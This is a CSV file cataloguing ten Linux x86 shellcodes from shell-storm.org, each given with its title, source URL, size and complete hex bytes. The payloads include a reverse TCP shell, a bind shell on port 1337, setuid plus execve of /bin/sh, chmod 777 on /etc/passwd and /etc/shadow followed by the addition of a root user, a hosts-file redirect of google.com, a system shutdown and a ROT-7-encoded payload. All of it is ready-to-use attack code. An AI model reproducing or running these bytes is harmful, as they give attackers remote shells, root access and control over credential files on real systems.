title,url,size,bytes
setuid + setgid + stdin re-open shellcode for linux/x86,https://shell-storm.org/shellcode/files/shellcode-906.html,71,83c41831c031dbb006cd8053682f747479682f64657689e331c966b91227b005cd806a175831dbcd806a2e5853cd8031c050682f2f73682f62696e89e3505389e199b00bcd80
ROT-7 Decoder Shellcode,https://shell-storm.org/shellcode/files/shellcode-900.html,74,eb255e31c9b11e803e077c05802e07eb1131db31d2b307b2ff66422a1e6629da881646e2e2eb05e8d6ffffff38c7576f69687a6f6f697075366f3636363690ea5790e95a90e8b712d487
add a new entry in hosts file pointing google.com to 127.1.1.1,https://shell-storm.org/shellcode/files/shellcode-893.html,77,31c9f7e1b00551686f737473682f2f2f68682f65746389e366b90104cd80936a0458eb10596a145acd806a0658cd806a0158cd80e8ebffffffffff3132372e312e312e3120676f6f676c652e636f6d
"Run /usr/bin/python | setreuid(),execve()",https://shell-storm.org/shellcode/files/shellcode-886.html,54,31c0b04631db31c9cd80eb165b31c088430f895b10894314b00b8d4b108d5314cd80e8e5ffffffffff2f7573722f62696e2f707974686f6e
chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Execute /bin/sh,https://shell-storm.org/shellcode/files/shellcode-885.html,378,31c031db6a0f58686a7377645bc1eb0853682f706173682f65746389e3684141ff0159c1e908c1e908cd806a0f58686a646f775bc1eb0853682f736861682f65746389e3684141ff0159c1e908c1e908cd806a055868417377645bc1eb0853682f706173682f65746389e3684141010459c1e908c1e908cd8089c36a0458684173680a59c1e90851686e2f6261683a2f626968726f6f74684c493a2f683a303a41684b2e3a3068667755576870703150687a5965416841614151684938757468504d5968685442747a68512f38546845366d676876502e73684e58523768394b554868722f59426856784b47683955665a6846566a6868466338796870596a7168776953686e54675468584d6937682f416e246870556e4d682436246a68414c493a89e1ba4141417fc1ea08c1ea08c1ea08cd8031c0b04631db31c9cd8031c0b04631db31c9cd806859595959596858585858682f736842682f62696e89e331c0884307895b0889430cb00b8d4b088d5314cd80b001b301cd80
Shell Reverse TCP Shellcode,https://shell-storm.org/shellcode/files/shellcode-883.html,74,6a66586a015b31d252536a0289e1cd8092b066687f0101016668053943665389e16a10515289e143cd806a025987dab03fcd804979f9b00b4189ca52682f2f7368682f62696e89e3cd80
Shell Bind TCP Shellcode Port 1337,https://shell-storm.org/shellcode/files/shellcode-882.html,89,6a66586a015b31f656536a0289e1cd805f9793b0665666680539665389e16a10515789e1cd80b066b304565789e1cd80b0664356565789e1cd805959b10293b03fcd804979f9b00b682f2f7368682f62696e89e34189cacd80
"sockfd trick + dup2(0,0), dup2(0,1), dup2(0,2) + execve /bin/sh",https://shell-storm.org/shellcode/files/shellcode-881.html,50,6a025b6a2958cd804889c631c9565b6a3f58cd804180f90375f56a0b58995231f656682f2f7368682f62696e89e331c9cd80
shutdown -h now,https://shell-storm.org/shellcode/files/shellcode-876.html,56,31c031d25066682d6889e7506a6e66c74424016f7789e75068646f776e6873687574686e2f2f2f682f73626989e35256575389e1b00bcd80
chmod 0777 /etc/shadow (a bit obfuscated),https://shell-storm.org/shellcode/files/shellcode-875.html,51,89c331d850be3e1f3a5681c623453521897424fcc74424f82f2f7368c74424f42f65746383ec0c89e36668ff016659b00fcd80
